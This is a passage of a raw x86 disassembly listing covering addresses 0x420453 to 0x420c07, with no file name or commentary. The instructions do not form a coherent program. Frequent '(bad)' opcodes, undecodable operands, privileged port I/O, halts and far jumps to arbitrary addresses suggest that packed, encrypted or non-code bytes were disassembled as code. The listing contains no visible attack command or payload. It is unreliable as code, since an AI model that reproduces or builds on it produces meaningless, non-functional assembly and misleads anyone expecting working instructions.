  420453:	mov    ebp,0x928bc4ad
  420458:	test   DWORD PTR [ecx-0x395c27a3],ebx
  42045e:	addr16 int3 
  420460:	ins    BYTE PTR es:[edi],dx
  420461:	mov    ah,BYTE PTR [ebx]
  420463:	call   0xc2f3890f
  420468:	or     al,0xf7
  42046a:	push   ebp
  42046b:	fwait
  42046c:	mov    ch,BYTE PTR [ebx+0x7a]
  42046f:	sbb    bh,BYTE PTR [edx]
  420471:	jo     0x420489
  420473:	jne    0x42045a
  420475:	xchg   esp,eax
  420476:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420477:	xchg   esi,ecx
  420479:	push   esi
  42047a:	mov    al,0x67
  42047c:	lds    esi,FWORD PTR [ebx]
  42047e:	in     al,dx
  42047f:	adc    cl,cl
  420481:	cmp    edi,DWORD PTR [edi]
  420483:	ja     0x420499
  420485:	sbb    ah,BYTE PTR [ebx+0x5f]
  420488:	mov    bl,0x28
  42048a:	hlt    
  42048b:	mov    dh,0xfe
  42048d:	xor    BYTE PTR [ebx+0x4550d465],cl
  420493:	mov    ?,WORD PTR [edx+0x3f8efbce]
  420499:	sub    cl,BYTE PTR [edi-0x31dc2e7d]
  42049f:	and    bl,dl
  4204a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204a2:	mov    bl,0x48
  4204a4:	inc    ebx
  4204a5:	(bad)  
  4204a7:	fstp   DWORD PTR [ebx-0x4f]
  4204aa:	sbb    eax,0xfc7420b9
  4204af:	mov    al,ds:0x62b86e13
  4204b4:	and    BYTE PTR [edx+0x3f4d758b],ah
  4204ba:	mov    al,ds:0x5618f61b
  4204bf:	ins    DWORD PTR es:[edi],dx
  4204c0:	sub    dl,cl
  4204c2:	jecxz  0x420539
  4204c4:	fild   DWORD PTR [ebx]
  4204c6:	fs jno 0x4204fe
  4204c9:	aad    0xfe
  4204cb:	(bad)  
  4204cc:	adc    al,0xf
  4204ce:	xor    al,0x37
  4204d0:	stos   DWORD PTR es:[edi],eax
  4204d1:	jge    0x4204cf
  4204d3:	lea    ebx,[edi-0x26]
  4204d6:	push   esi
  4204d7:	xchg   ebx,eax
  4204d8:	xor    al,0xa7
  4204da:	das    
  4204db:	out    dx,al
  4204dc:	outs   dx,BYTE PTR ds:[esi]
  4204dd:	push   edx
  4204de:	mov    ebx,0xac3fce5e
  4204e3:	ficom  WORD PTR [ecx+0x1eac00fc]
  4204e9:	dec    ebp
  4204ea:	add    al,0xb3
  4204ec:	ror    BYTE PTR [edi+ebx*4],0xbf
  4204f0:	sub    al,0xbf
  4204f2:	ss loopne 0x42050c
  4204f5:	add    edi,DWORD PTR [esi-0x679cc8b0]
  4204fb:	lods   eax,DWORD PTR ds:[esi]
  4204fc:	mov    esi,0xb8f7f4c8
  420501:	push   ds
  420502:	push   ds
  420503:	dec    ebx
  420504:	and    ch,bl
  420506:	dec    esp
  420507:	push   esi
  420508:	or     cl,BYTE PTR [edi]
  42050a:	int3   
  42050b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42050c:	cmc    
  42050d:	dec    ecx
  42050e:	xchg   DWORD PTR [ecx+0x5d],ebp
  420511:	push   edi
  420512:	fbld   TBYTE PTR [edx+0x3a]
  420515:	dec    edi
  420516:	loopne 0x420556
  420518:	mov    eax,ds:0x1c1c2053
  42051d:	sbb    bl,dh
  42051f:	or     ebp,DWORD PTR [ecx+0x77c5b647]
  420525:	cmp    ah,BYTE PTR [eax-0x1f627b07]
  42052b:	repz cs pop ecx
  42052e:	inc    esi
  42052f:	mov    edi,0xc40a3a9
  420534:	or     DWORD PTR ds:[ebp-0x75],esp
  420538:	pushf  
  420539:	cwde   
  42053a:	dec    ebx
  42053b:	dec    edx
  42053c:	xlat   BYTE PTR ds:[ebx]
  42053d:	fiadd  DWORD PTR [edi+0x2a]
  420540:	ja     0x420545
  420542:	and    DWORD PTR [edx-0x53],edx
  420545:	mov    ch,0x6b
  420547:	sub    eax,0xc2328bfe
  42054c:	rol    DWORD PTR [ebx+0x18],cl
  42054f:	push   es
  420550:	adc    al,0xeb
  420552:	push   eax
  420553:	push   ebp
  420554:	fisttp DWORD PTR [esi+0x780df045]
  42055a:	push   ss
  42055b:	test   al,0x41
  42055d:	sub    eax,0x1a37c660
  420562:	into   
  420563:	sti    
  420564:	and    dl,ch
  420566:	test   dh,bh
  420568:	jecxz  0x4205b3
  42056a:	push   ss
  42056b:	fdiv   QWORD PTR [ebp+0x593dd86e]
  420571:	mov    ds:0x66395533,eax
  420576:	jg     0x4205bf
  420578:	pop    ebp
  420579:	or     dl,bh
  42057b:	pop    ebp
  42057c:	enter  0xbe33,0x7c
  420580:	xchg   edx,eax
  420581:	retf   0xaae1
  420584:	dec    eax
  420585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420586:	lds    eax,FWORD PTR [esi]
  420588:	hlt    
  420589:	mov    eax,ds:0x802f4193
  42058e:	iret   
  42058f:	iret   
  420590:	sub    edi,DWORD PTR [ebx-0x21]
  420593:	daa    
  420594:	push   eax
  420595:	ja     0x4205b9
  420597:	cdq    
  420598:	enter  0x6ef5,0x1
  42059c:	repz cmp al,BYTE PTR [esi-0x2aadf974]
  4205a3:	outs   dx,DWORD PTR ds:[esi]
  4205a4:	mov    edi,0x2784a0c6
  4205a9:	outs   dx,DWORD PTR ds:[esi]
  4205aa:	and    eax,DWORD PTR [ebx+0x62]
  4205ad:	stos   DWORD PTR es:[edi],eax
  4205ae:	ins    DWORD PTR es:[edi],dx
  4205af:	lahf   
  4205b0:	or     al,0x24
  4205b2:	outs   dx,DWORD PTR ds:[esi]
  4205b3:	nop
  4205b4:	dec    eax
  4205b5:	fs mov bh,0x51
  4205b8:	fstp   st(3)
  4205ba:	sbb    BYTE PTR [ecx-0x79],dl
  4205bd:	gs xchg ebx,eax
  4205bf:	scas   al,BYTE PTR es:[edi]
  4205c0:	mov    edi,0x8caaf0c5
  4205c5:	jmp    0x4205c8
  4205c7:	mov    ?,WORD PTR [edi+0x7f9c06f6]
  4205cd:	push   ds
  4205ce:	popa   
  4205cf:	inc    edx
  4205d0:	in     eax,0x78
  4205d2:	jge    0x4205da
  4205d4:	or     ah,BYTE PTR ds:0xa1daaded
  4205da:	scas   eax,DWORD PTR es:[edi]
  4205db:	iret   
  4205dc:	push   esp
  4205dd:	pushf  
  4205de:	fsubr  QWORD PTR [ebx]
  4205e0:	aad    0xa4
  4205e2:	int    0x60
  4205e4:	in     al,dx
  4205e5:	aas    
  4205e6:	rcl    DWORD PTR [ecx-0x6c],0x7a
  4205ea:	sahf   
  4205eb:	xchg   esi,eax
  4205ec:	xchg   esi,eax
  4205ed:	popf   
  4205ee:	mov    bl,0xc2
  4205f0:	xchg   DWORD PTR [esp+edx*8],esp
  4205f3:	aad    0x7
  4205f5:	je     0x4205c7
  4205f7:	inc    ebp
  4205f8:	mov    ds:0x5e2981f3,al
  4205fd:	scas   al,BYTE PTR es:[edi]
  4205fe:	das    
  4205ff:	arpl   WORD PTR [esi],dx
  420601:	mov    al,0x86
  420603:	xor    al,0x5e
  420605:	xchg   edi,eax
  420606:	inc    edx
  420607:	or     BYTE PTR [edx],cl
  420609:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42060a:	imul   esp,DWORD PTR [ebp+0x30],0x35
  42060e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42060f:	cdq    
  420610:	stc    
  420611:	cmp    DWORD PTR [edi-0xe],eax
  420614:	adc    edi,0x4cc391b5
  42061a:	clc    
  42061b:	(bad)  
  42061c:	out    dx,al
  42061d:	lock adc ebp,DWORD PTR [esi]
  420620:	lock cmp eax,0x78bd4365
  420626:	test   eax,0xe210ace6
  42062b:	pop    ds
  42062c:	or     BYTE PTR [edx-0x37],ah
  42062f:	test   BYTE PTR [ecx+0x41],0xb1
  420633:	in     eax,0x1f
  420635:	cdq    
  420636:	xchg   edi,eax
  420637:	iret   
  420638:	dec    esp
  420639:	aaa    
  42063a:	cli    
  42063b:	jge    0x4205d5
  42063d:	dec    esi
  42063e:	retf   0x1e82
  420641:	pop    esi
  420642:	jmp    0x8e91aa97
  420647:	jp     0x42068e
  420649:	shr    DWORD PTR [esi+0x5c2ddadb],0xb0
  420650:	and    DWORD PTR [ebx+0x1c],esi
  420653:	sub    DWORD PTR [eax+0x232d328e],esp
  420659:	and    BYTE PTR [ebx],bl
  42065b:	cdq    
  42065c:	and    eax,0x873a2dc6
  420661:	dec    esp
  420662:	add    eax,0xd967a195
  420667:	push   cs
  420668:	add    BYTE PTR [ecx+0x66],ah
  42066b:	clc    
  42066c:	or     cl,ah
  42066e:	ret    
  42066f:	pop    eax
  420670:	jecxz  0x4206b0
  420672:	fbstp  TBYTE PTR [ecx+0x71284d9]
  420678:	in     al,0xbe
  42067a:	pop    edi
  42067b:	jo     0x42060a
  42067d:	leave  
  42067e:	call   0xe683:0x24435184
  420685:	cwde   
  420686:	std    
  420687:	mov    eax,es
  420689:	jle    0x4206c4
  42068b:	pop    ss
  42068c:	or     DWORD PTR [eax-0x6aaa454],ebx
  420692:	or     DWORD PTR [eax-0x793d2036],0xac3e0f74
  42069c:	popa   
  42069d:	pop    edx
  42069e:	mov    al,ds:0x948073d6
  4206a3:	push   es
  4206a4:	mov    esp,0x3ff8425d
  4206a9:	push   0xffffffc9
  4206ab:	or     bl,BYTE PTR [edi]
  4206ad:	xchg   edi,eax
  4206ae:	mov    BYTE PTR [esi+0x7caecfb7],0x32
  4206b5:	scas   eax,DWORD PTR es:[edi]
  4206b6:	adc    DWORD PTR ds:0x6e00adc9,esi
  4206bc:	push   es
  4206bd:	or     eax,0x2769f365
  4206c2:	ins    BYTE PTR es:[edi],dx
  4206c3:	pop    ds
  4206c4:	daa    
  4206c5:	lahf   
  4206c6:	into   
  4206c7:	and    DWORD PTR [esi-0x58b9a97e],ecx
  4206cd:	iret   
  4206ce:	(bad)  
  4206cf:	mov    al,ds:0x83c7d196
  4206d4:	push   es
  4206d5:	push   ebx
  4206d6:	(bad)  
  4206d7:	push   ss
  4206d8:	ins    BYTE PTR es:[edi],dx
  4206d9:	mov    WORD PTR [edx-0x208ce542],ss
  4206df:	jnp    0x4206dd
  4206e1:	rol    DWORD PTR [edi-0x3],cl
  4206e4:	js     0x4206ae
  4206e6:	mov    ebx,0x4411e94b
  4206eb:	sub    eax,0xd8909b4c
  4206f0:	pop    ebx
  4206f1:	adc    BYTE PTR [edi+0x196a2761],dl
  4206f7:	adc    ebp,esp
  4206f9:	fldl2t 
  4206fb:	and    al,0xe9
  4206fd:	xor    eax,DWORD PTR [edi+0x60b09d01]
  420703:	xchg   edi,eax
  420704:	mov    bl,0x83
  420706:	push   ebp
  420707:	pop    esp
  420708:	ins    DWORD PTR es:[edi],dx
  420709:	pop    ebp
  42070a:	inc    ecx
  42070b:	(bad)  
  42070c:	push   edi
  42070d:	iret   
  42070e:	xor    BYTE PTR [ecx+0x6d],0xe1
  420712:	fiadd  WORD PTR [ebp+0x69761e65]
  420718:	mov    cl,0xa6
  42071a:	out    dx,al
  42071b:	xchg   esi,eax
  42071c:	popf   
  42071d:	popa   
  42071e:	popf   
  42071f:	or     ebp,ebp
  420721:	and    eax,0x2ee4b7b9
  420726:	xchg   edi,eax
  420727:	jns    0x42073d
  420729:	add    ah,BYTE PTR [edx]
  42072b:	xlat   BYTE PTR ds:[ebx]
  42072c:	inc    ebp
  42072d:	lods   eax,DWORD PTR ds:[esi]
  42072e:	shl    BYTE PTR [esi+ebp*2-0x359ccec5],cl
  420735:	push   0x17
  420737:	xchg   esi,eax
  420738:	and    DWORD PTR [esi-0x31396089],0x315eb1e4
  420742:	fisubr WORD PTR [ebp+0x37]
  420745:	call   0x575:0xb9fd582d
  42074c:	push   cs
  42074d:	push   esi
  42074e:	sbb    al,0x3
  420750:	(bad)  
  420751:	sahf   
  420752:	jbe    0x420726
  420754:	mov    ebp,0xc7a1579a
  420759:	sbb    ebp,DWORD PTR ds:0xab288a31
  42075f:	push   ebx
  420760:	push   edi
  420761:	hlt    
  420762:	mov    bl,0x5d
  420764:	push   0xffffffca
  420766:	loope  0x420703
  420768:	jmp    0xb089:0xa2cfda23
  42076f:	sub    eax,0x3b111de8
  420774:	add    BYTE PTR [edx],bl
  420776:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420777:	inc    eax
  420778:	ds icebp 
  42077a:	add    eax,0xde5e8cac
  42077f:	push   ds
  420780:	or     eax,0x2cd5539
  420785:	cli    
  420786:	(bad)  
  420787:	fmul   st,st(3)
  420789:	stc    
  42078a:	inc    ebx
  42078b:	xor    al,0x3
  42078d:	xchg   BYTE PTR [edi],ch
  42078f:	arpl   WORD PTR [esi+0x30f43256],bp
  420795:	rcl    DWORD PTR [eax],cl
  420797:	sbb    DWORD PTR [esp+edx*8+0x6a],edi
  42079b:	sahf   
  42079c:	mov    ebx,DWORD PTR [esi]
  42079e:	test   BYTE PTR [ecx+esi*2],al
  4207a1:	dec    edx
  4207a2:	xor    DWORD PTR [ecx+0x1dcc4a4f],esi
  4207a8:	push   esp
  4207a9:	inc    esi
  4207aa:	mov    cl,0xa8
  4207ac:	or     ah,BYTE PTR [edi+0x15]
  4207af:	jne    0x4207b9
  4207b1:	sbb    DWORD PTR [edi+0x2c197184],ebp
  4207b7:	cmp    eax,0xe9b1ac07
  4207bc:	pop    ebx
  4207bd:	cmp    eax,DWORD PTR [esi+0x131ade44]
  4207c3:	and    edi,DWORD PTR gs:[edx+0x1213d541]
  4207ca:	pop    eax
  4207cb:	jp     0x420774
  4207cd:	test   BYTE PTR [eax],al
  4207cf:	push   edx
  4207d0:	arpl   WORD PTR [ecx+0x23],dx
  4207d3:	push   0xffffffb8
  4207d5:	inc    ebp
  4207d6:	ret    0xc50
  4207d9:	mov    ecx,0xfb2d2ed9
  4207de:	rcr    BYTE PTR [esi-0x3f],1
  4207e1:	test   BYTE PTR [ebx+0x6],0x1c
  4207e5:	push   edx
  4207e6:	popa   
  4207e7:	stos   DWORD PTR es:[edi],eax
  4207e8:	jns    0x420783
  4207ea:	pusha  
  4207eb:	push   esp
  4207ec:	sbb    BYTE PTR [edx],bl
  4207ee:	xor    bl,BYTE PTR [eax-0x32]
  4207f1:	or     al,0x76
  4207f3:	and    edx,DWORD PTR [eax+0x7b]
  4207f6:	cmp    al,0x4c
  4207f8:	test   al,0x49
  4207fa:	add    al,0xf3
  4207fc:	enter  0xed0a,0x8b
  420800:	dec    edi
  420801:	stos   BYTE PTR es:[edi],al
  420802:	imul   ebx,DWORD PTR [edx],0xfffffff8
  420805:	fldcw  WORD PTR [edi+0x1c8eccc8]
  42080b:	jno    0x42081f
  42080d:	aam    0xc0
  42080f:	outs   dx,DWORD PTR ds:[esi]
  420810:	jecxz  0x4207a9
  420812:	and    eax,0x19af82c
  420817:	push   ebx
  420818:	mov    ah,ah
  42081a:	xchg   ebp,eax
  42081b:	xchg   esi,eax
  42081c:	jge    0x420868
  42081e:	jle    0x42086e
  420820:	xchg   ebx,eax
  420821:	popf   
  420822:	out    0xbf,eax
  420824:	inc    esi
  420825:	test   DWORD PTR [eax-0x35],esp
  420828:	rcl    cx,cl
  42082b:	loop   0x4208a4
  42082d:	cli    
  42082e:	sub    edx,DWORD PTR [esi]
  420830:	mov    bl,0x62
  420832:	call   DWORD PTR [esi+0x62]
  420835:	jo     0x4207f7
  420837:	(bad)  
  420838:	push   ecx
  420839:	jno    0x4207dd
  42083b:	(bad)  
  42083c:	cld    
  42083d:	rcr    BYTE PTR [esi],0x74
  420840:	adc    bh,ch
  420842:	xchg   esi,eax
  420843:	mov    ebp,0xdc940fca
  420848:	popa   
  420849:	out    dx,al
  42084a:	cli    
  42084b:	int    0xbc
  42084d:	inc    edx
  42084e:	call   0x6222:0x2c317950
  420855:	loope  0x4207f8
  420857:	or     esi,DWORD PTR [ebp-0x182d1465]
  42085d:	mov    cl,0xd0
  42085f:	out    dx,al
  420860:	inc    ecx
  420861:	mov    BYTE PTR [ecx+0x6d857a1a],bh
  420867:	push   edx
  420868:	jne    0x420849
  42086a:	mov    edx,0x66597111
  42086f:	ret    
  420870:	sar    BYTE PTR [edi+0x7b77c6c3],cl
  420876:	jns    0x4207fa
  420878:	enter  0xd6e4,0x9e
  42087c:	mov    edi,0x5d350403
  420881:	xchg   ebx,eax
  420882:	or     ebp,DWORD PTR [ecx+0xd]
  420885:	loopne 0x4208ee
  420887:	data16 (bad) 
  420889:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42088a:	leave  
  42088b:	stos   DWORD PTR es:[edi],eax
  42088c:	or     edi,edi
  42088e:	(bad)  
  42088f:	mov    bl,0xfe
  420891:	stos   DWORD PTR es:[edi],eax
  420892:	stos   BYTE PTR es:[edi],al
  420893:	jmp    0x4208aa
  420895:	aaa    
  420896:	(bad)  
  420898:	jg     0x420859
  42089a:	adc    al,0xfb
  42089c:	or     bl,BYTE PTR [esi+edx*2-0x7c943270]
  4208a3:	add    BYTE PTR [esi+0x12],dh
  4208a6:	add    eax,0x552e0b9c
  4208ab:	test   BYTE PTR [edx+eiz*4-0x72],bl
  4208af:	jo     0x4208bf
  4208b1:	je     0x42083e
  4208b3:	lods   eax,DWORD PTR ds:[esi]
  4208b4:	cmp    ecx,ebp
  4208b6:	call   0x340764de
  4208bb:	not    BYTE PTR [ebp+0x160a51fa]
  4208c1:	rol    ah,0xe6
  4208c4:	push   esp
  4208c5:	adc    al,0xf7
  4208c7:	pushf  
  4208c8:	retf   
  4208c9:	jmp    0xabb9:0x6d788bc1
  4208d0:	pushf  
  4208d1:	fist   DWORD PTR [edi+0x34]
  4208d4:	mov    cl,0x41
  4208d6:	lahf   
  4208d7:	and    BYTE PTR [ebx-0x1e],al
  4208da:	mov    WORD PTR [eax],es
  4208dc:	jl     0x420907
  4208de:	(bad)  
  4208df:	jnp    0x420914
  4208e1:	fld    TBYTE PTR [edx-0x4a]
  4208e4:	mov    bh,0x7f
  4208e6:	or     cl,0x1d
  4208e9:	pop    es
  4208ea:	pop    ss
  4208eb:	(bad)  
  4208ec:	jmp    FWORD PTR [edi-0x1c]
  4208ef:	jge    0x420875
  4208f1:	mov    dl,0x84
  4208f3:	nop
  4208f4:	sub    ch,BYTE PTR [ecx+edx*1-0x4d5f440f]
  4208fb:	sub    al,0x7a
  4208fd:	stos   DWORD PTR es:[edi],eax
  4208fe:	or     ch,BYTE PTR [edx+0x51]
  420901:	mov    eax,ds:0xa30e47b7
  420906:	sbb    al,0x5d
  420908:	mov    edi,0xd002eb12
  42090d:	in     eax,dx
  42090e:	(bad)  
  42090f:	jge    0x42095f
  420911:	adc    al,0xb3
  420913:	aam    0x45
  420915:	xchg   ebp,eax
  420916:	call   0x962125c8
  42091b:	jb     0x420973
  42091d:	retf   
  42091e:	jl     0x420938
  420920:	fidivr WORD PTR [esi+0x480545cf]
  420926:	xor    dh,dl
  420928:	xor    DWORD PTR [edi],ecx
  42092a:	push   es
  42092b:	test   DWORD PTR [ecx],0xa9df9cf5
  420931:	jge    0x420942
  420933:	fstp   QWORD PTR [esi+0x31f6bb3d]
  420939:	sbb    dh,dl
  42093b:	aad    0x92
  42093d:	aam    0x3c
  42093f:	sbb    DWORD PTR [edi-0x70],0xd041c6b3
  420946:	inc    edx
  420947:	sub    dl,0x5b
  42094a:	int    0x16
  42094c:	(bad)  
  42094e:	inc    esp
  42094f:	sub    ebp,esi
  420951:	jbe    0x4208df
  420953:	sbb    eax,DWORD PTR [edi+0x3f618b58]
  420959:	repz pop esp
  42095b:	in     al,dx
  42095c:	add    ebx,DWORD PTR [esi]
  42095e:	call   0x2a324121
  420963:	and    ch,BYTE PTR [ecx]
  420965:	xchg   ebp,eax
  420966:	xchg   ebx,eax
  420967:	xchg   ecx,eax
  420968:	mov    ebp,0xc11b3b45
  42096d:	mov    dh,0x29
  42096f:	lock inc esi
  420971:	dec    DWORD PTR [ebx+eiz*8-0x3d]
  420975:	loopne 0x4209b6
  420977:	popf   
  420978:	popa   
  420979:	adc    dh,ch
  42097b:	out    dx,al
  42097c:	repz in eax,0x69
  42097f:	mov    esi,0x1f29a372
  420984:	hlt    
  420985:	ins    BYTE PTR es:[edi],dx
  420986:	(bad)  
  420987:	imul   dh
  420989:	mov    edx,0xa57e09c
  42098e:	mov    ah,0x27
  420990:	cwde   
  420991:	shl    dl,1
  420993:	mul    ebp
  420995:	and    dh,BYTE PTR [ebx-0x1f]
  420998:	sar    esp,1
  42099a:	dec    edi
  42099b:	dec    ecx
  42099c:	jb     0x420929
  42099e:	push   ebp
  42099f:	(bad)  
  4209a0:	xor    eax,0x6760406a
  4209a5:	shl    BYTE PTR [ebx],0x36
  4209a8:	pop    esp
  4209a9:	xor    BYTE PTR [edx],0xdc
  4209ac:	inc    eax
  4209ad:	mov    ebx,0xbafaa1cb
  4209b2:	iret   
  4209b3:	std    
  4209b4:	outs   dx,BYTE PTR ds:[esi]
  4209b5:	test   eax,0xe2ec5775
  4209ba:	loopne 0x420a24
  4209bc:	push   0x62f9a90d
  4209c1:	sbb    DWORD PTR [edi+eiz*4-0x4268ec4c],ecx
  4209c8:	pushf  
  4209c9:	dec    ecx
  4209ca:	sbb    esi,DWORD PTR [edx+0x209ca2d6]
  4209d0:	jae    0x420a3d
  4209d2:	inc    ebx
  4209d3:	mov    cs,WORD PTR [eax]
  4209d5:	cdq    
  4209d6:	jb     0x4209f6
  4209d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209d9:	xchg   esp,eax
  4209da:	mov    esi,DWORD PTR [ebp-0x2386d134]
  4209e0:	pop    eax
  4209e1:	jb     0x420990
  4209e3:	cmp    DWORD PTR [ebx-0x22],eax
  4209e6:	inc    ebp
  4209e7:	in     eax,dx
  4209e8:	aaa    
  4209e9:	mov    al,0x5f
  4209eb:	js     0x4209a9
  4209ed:	out    0xf3,al
  4209ef:	ret    
  4209f0:	sbb    esp,0x44
  4209f3:	mov    ebp,0xd05afbdb
  4209f8:	stc    
  4209f9:	cdq    
  4209fa:	out    dx,eax
  4209fb:	xchg   esi,eax
  4209fc:	int3   
  4209fd:	sub    eax,0xf7e0a1c1
  420a02:	mov    BYTE PTR [esi-0x66],ch
  420a05:	cmp    eax,0x22558220
  420a0a:	rol    BYTE PTR [eax+0x4bbfb6b7],1
  420a10:	out    0x3b,eax
  420a12:	(bad)  
  420a13:	or     DWORD PTR [eax+0x67],ebp
  420a16:	sub    edi,eax
  420a18:	popa   
  420a19:	(bad)  
  420a1a:	loop   0x420a57
  420a1c:	scas   eax,DWORD PTR es:[edi]
  420a1d:	mov    dl,0x31
  420a1f:	sub    DWORD PTR [ebp-0x9f32a1a],0x4533872c
  420a29:	lods   al,BYTE PTR ds:[esi]
  420a2a:	cmc    
  420a2b:	inc    edx
  420a2c:	ret    0x21c2
  420a2f:	pushf  
  420a30:	push   0x7
  420a32:	jne    0x4209bc
  420a34:	xor    al,BYTE PTR [ebp-0x5b7b500e]
  420a3a:	je     0x420a52
  420a3c:	push   es
  420a3d:	mov    WORD PTR [edx+0x3b59b05d],fs
  420a43:	or     bl,BYTE PTR [edi+0x53]
  420a46:	cwde   
  420a47:	mov    ebp,0x94eae24b
  420a4c:	dec    ebx
  420a4d:	in     eax,dx
  420a4e:	dec    ecx
  420a4f:	xor    eax,0xc4d404a2
  420a54:	in     al,0xed
  420a56:	jae    0x420a04
  420a58:	(bad)
  420a5b:	cs push eax
  420a5d:	popf   
  420a5e:	mov    eax,0x5bc68a35
  420a63:	sub    DWORD PTR [edx-0x50],0x623e27de
  420a6a:	xor    eax,0x68ad81fd
  420a6f:	test   eax,0x4c8897ae
  420a74:	cld    
  420a75:	into   
  420a76:	retf   
  420a77:	cdq    
  420a78:	js     0x420ace
  420a7a:	mov    ebx,0x3d0add1a
  420a7f:	and    dl,dh
  420a81:	sar    BYTE PTR [edi+0x77],1
  420a84:	fwait
  420a85:	cmp    al,0x5c
  420a87:	pop    es
  420a88:	fsubr  QWORD PTR [ebx]
  420a8a:	jbe    0x420afd
  420a8c:	scas   eax,DWORD PTR es:[edi]
  420a8d:	lock inc esp
  420a8f:	sub    eax,0x187746ed
  420a94:	popf   
  420a95:	mov    al,0xd5
  420a97:	inc    esi
  420a98:	icebp  
  420a99:	test   BYTE PTR [esi+eiz*2-0x34],dl
  420a9d:	push   esp
  420a9e:	shl    DWORD PTR [ebp-0x5a],0x18
  420aa2:	cwde   
  420aa3:	adc    ebx,DWORD PTR [ecx]
  420aa5:	xchg   BYTE PTR fs:[ebp+0x28],bh
  420aa9:	dec    ebx
  420aaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420aab:	arpl   WORD PTR [ebp+0x728ccace],bp
  420ab1:	test   BYTE PTR ds:0xbe039a22,bh
  420ab7:	scas   al,BYTE PTR es:[edi]
  420ab8:	cwde   
  420ab9:	dec    ebp
  420aba:	sbb    eax,0x5c669fac
  420abf:	ins    BYTE PTR es:[edi],dx
  420ac0:	push   ebp
  420ac1:	sbb    eax,0x41b30b57
  420ac6:	sub    al,BYTE PTR gs:[ebp-0x2b]
  420aca:	test   al,0x25
  420acc:	or     bl,BYTE PTR [ebp-0x1b2ea730]
  420ad2:	aam    0x64
  420ad4:	and    eax,0x7f5e6870
  420ad9:	retf   
  420ada:	inc    eax
  420adb:	fisttp DWORD PTR [ebx+0x2f]
  420ade:	aaa    
  420adf:	cmp    ebx,0x23521d4
  420ae5:	and    eax,0xf9a54d8
  420aea:	jmp    0x420aad
  420aec:	arpl   WORD PTR [ebx+edi*8],cx
  420aef:	in     al,dx
  420af0:	push   ss
  420af1:	popa   
  420af2:	int    0x7f
  420af4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420af5:	stc    
  420af6:	sub    eax,0xabb6770b
  420afb:	cmc    
  420afc:	xchg   edi,eax
  420afd:	test   BYTE PTR ds:0x2aa1b24a,al
  420b03:	xor    DWORD PTR [esi+0xf2abab8],ebp
  420b09:	jo     0x420b4c
  420b0b:	cmp    bh,ah
  420b0d:	imul   BYTE PTR ss:[ebx]
  420b10:	retf   
  420b11:	inc    edx
  420b12:	push   0x4f
  420b14:	mov    edi,0xbbb0677f
  420b19:	add    eax,0x36e24a4b
  420b1e:	push   ebx
  420b1f:	iret   
  420b20:	loopne 0x420ae8
  420b22:	mov    ebx,0x37a382e2
  420b27:	adc    al,ah
  420b29:	idiv   BYTE PTR ds:0x44178f8f
  420b2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b30:	or     eax,0xa4d3821d
  420b35:	sub    esi,esp
  420b37:	push   ds
  420b38:	xchg   ebp,eax
  420b39:	cmp    bh,ah
  420b3b:	dec    ecx
  420b3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b3d:	push   esi
  420b3e:	or     dh,bh
  420b40:	inc    edi
  420b41:	push   esp
  420b42:	xchg   edx,eax
  420b43:	cs mov dl,0x3a
  420b46:	jmp    0x420b73
  420b48:	push   ecx
  420b49:	add    BYTE PTR [ebp-0x58da3ac5],bh
  420b4f:	mov    esp,0xf9a61ec9
  420b54:	add    ecx,DWORD PTR [edi-0x2]
  420b57:	aas    
  420b58:	sub    al,0x4
  420b5a:	test   eax,0xd384ad7
  420b5f:	add    DWORD PTR [esi],ebx
  420b61:	mov    ah,0xaf
  420b63:	adc    eax,0x15baf28f
  420b68:	pop    esi
  420b69:	xor    DWORD PTR [eax-0x3265a74c],esi
  420b6f:	ret    0x36c5
  420b72:	jbe    0x420b26
  420b74:	into   
  420b75:	sbb    bh,BYTE PTR [edi-0x7]
  420b78:	and    DWORD PTR [ecx],ecx
  420b7a:	fistp  DWORD PTR [edi-0x3c]
  420b7d:	ret    
  420b7e:	test   DWORD PTR [eax-0x19c7b74a],0x2ade81d6
  420b88:	mov    cl,0xd4
  420b8a:	mov    ds:0x97573cd8,eax
  420b8f:	mov    bl,0x5d
  420b91:	cwde   
  420b92:	and    DWORD PTR ds:0x6d4e793b,0xffffffdb
  420b99:	cmp    esp,ecx
  420b9b:	mov    edi,0x82d9afb
  420ba0:	dec    ebx
  420ba1:	clc    
  420ba2:	pop    es
  420ba3:	xlat   BYTE PTR ds:[ebx]
  420ba4:	aas    
  420ba5:	mov    al,ds:0x64fb57b
  420baa:	xlat   BYTE PTR ds:[ebx]
  420bab:	cwde   
  420bac:	js     0x420b36
  420bae:	aam    0x56
  420bb0:	ret    0x2d6e
  420bb3:	pop    ebx
  420bb4:	jmp    0x3669ff49
  420bb9:	cmp    edx,DWORD PTR [esi]
  420bbb:	push   ds
  420bbc:	and    BYTE PTR [eax+ebp*2],0x2e
  420bc0:	rcr    BYTE PTR ds:0x53597686,cl
  420bc6:	mov    eax,0xf3ff192b
  420bcb:	sbb    al,0xad
  420bcd:	out    0x76,eax
  420bcf:	test   eax,0xbc3f2ed7
  420bd4:	jecxz  0x420bf5
  420bd6:	das    
  420bd7:	in     eax,0xb4
  420bd9:	fsub   QWORD PTR [ebx]
  420bdb:	jo     0x420bc8
  420bdd:	adc    al,0x5d
  420bdf:	mov    al,ds:0x2eb94463
  420be4:	clc    
  420be5:	inc    eax
  420be6:	int    0xe5
  420be8:	push   ss
  420be9:	sbb    al,0x7d
  420beb:	xor    DWORD PTR [ebx+0x62],esp
  420bee:	dec    edi
  420bef:	(bad)  
  420bf0:	out    dx,eax
  420bf1:	dec    edi
  420bf2:	or     eax,0x52f1f9a5
  420bf7:	add    DWORD PTR [ecx+ecx*1-0xbc1fdd8],esi
  420bfe:	and    dh,BYTE PTR [ecx]
  420c00:	mov    edi,edi
  420c02:	rol    BYTE PTR [ebx+0x3b],1
  420c05:	repnz pop es
  420c07:	jmp    0x9f843208
